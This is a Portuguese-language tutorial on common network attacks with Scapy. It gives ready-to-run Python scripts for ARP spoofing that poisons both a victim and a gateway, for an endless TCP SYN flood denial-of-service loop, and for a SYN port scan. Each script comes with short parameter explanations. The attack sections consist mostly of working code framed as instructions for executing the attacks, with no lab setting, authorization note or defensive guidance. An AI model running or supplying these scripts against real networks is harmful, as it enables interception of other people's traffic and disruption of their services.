# Ataques Comuns com Scapy

### ARP Spoofing: Manipulação de Pacotes ARP para Redirecionar Tráfego

**ARP Spoofing** é um ataque que envolve o envio de respostas ARP falsas na rede local para associar o endereço MAC do atacante ao endereço IP de outro dispositivo, geralmente o gateway da rede. Isso permite interceptar, redirecionar ou modificar o tráfego de rede entre dispositivos.

- **Como Executar um ARP Spoofing com Scapy**

  O exemplo abaixo mostra como enviar respostas ARP falsas para enganar um alvo e redirecionar o tráfego para o atacante.

  ```python
  from scapy.all import *
  import time

  # Defina o IP da vítima e do gateway
  ip_vitima = "192.168.1.100"
  ip_gateway = "192.168.1.1"

  # Obtenha o endereço MAC do seu próprio dispositivo
  mac_atacante = get_if_hwaddr(conf.iface)

  # Crie um pacote ARP para enganar a vítima
  pacote_vitima = ARP(op=2, pdst=ip_vitima, psrc=ip_gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_atacante)

  # Crie um pacote ARP para enganar o gateway
  pacote_gateway = ARP(op=2, pdst=ip_gateway, psrc=ip_vitima, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_atacante)

  print("Iniciando ARP Spoofing...")

  try:
      while True:
          # Enviar os pacotes para a vítima e para o gateway
          send(pacote_vitima, verbose=False)
          send(pacote_gateway, verbose=False)
          time.sleep(2)  # Intervalo entre os pacotes
  except KeyboardInterrupt:
      print("Ataque interrompido.")
  ```
  
  - `op=2`: Indica que o pacote é uma resposta ARP.
  - `pdst`: IP de destino da resposta ARP (vítima ou gateway).
  - `psrc`: IP de origem da resposta ARP (gateway ou vítima).

### TCP SYN Flood: Ataque de Negação de Serviço

**TCP SYN Flood** é um ataque de negação de serviço (DoS) que envolve o envio de um grande número de pacotes SYN para um servidor, sobrecarregando sua capacidade de manter conexões abertas e impedindo que ele responda a novas conexões legítimas.

- **Como Executar um TCP SYN Flood com Scapy**

  O exemplo abaixo mostra como enviar pacotes SYN para uma porta de destino, simulando um ataque de SYN Flood.

  ```python
  from scapy.all import *

  # Defina o IP de destino e a porta alvo
  ip_destino = "192.168.1.1"
  porta_destino = 80

  # Crie um pacote TCP SYN
  pacote_syn = IP(dst=ip_destino)/TCP(dport=porta_destino, flags="S")

  print("Iniciando TCP SYN Flood...")

  # Loop para enviar pacotes continuamente
  try:
      while True:
          send(pacote_syn, verbose=False)
  except KeyboardInterrupt:
      print("Ataque interrompido.")
  ```

  - `flags="S"`: Define a flag SYN, usada para iniciar conexões TCP.
  - `send()`: Envia os pacotes SYN sem esperar por respostas.

#### Port Scanning: Varredura de Portas com Pacotes Personalizados

**Port Scanning** é uma técnica para identificar quais portas em um servidor estão abertas e ativas, podendo ser usado para explorar vulnerabilidades. Scapy permite criar pacotes personalizados para explorar portas específicas com diferentes técnicas.

- **Como Executar um Port Scanning com Scapy**

  O exemplo abaixo utiliza pacotes SYN para realizar uma varredura em múltiplas portas de um alvo.

  ```python
  from scapy.all import *

  # Defina o IP de destino e a faixa de portas a escanear
  ip_destino = "192.168.1.1"
  portas = range(20, 1024)  # Varredura das portas 20 a 1024

  print("Iniciando Port Scanning...")

  # Função para enviar um pacote SYN e verificar a resposta
  def scan_port(porta):
      pacote = IP(dst=ip_destino)/TCP(dport=porta, flags="S")
      resposta = sr1(pacote, timeout=1, verbose=False)
      if resposta and resposta.haslayer(TCP) and resposta[TCP].flags == 18:  # SYN-ACK flag
          print(f"Porta {porta} está aberta.")

  # Varredura de portas na faixa especificada
  for porta in portas:
      scan_port(porta)
  ```

  - `sr1()`: Envia o pacote e recebe a primeira resposta.
  - `flags="S"`: Envia um pacote SYN para verificar se a porta está aberta.
  - `resposta[TCP].flags == 18`: Verifica se a resposta contém a flag SYN-ACK, indicando que a porta está aberta.
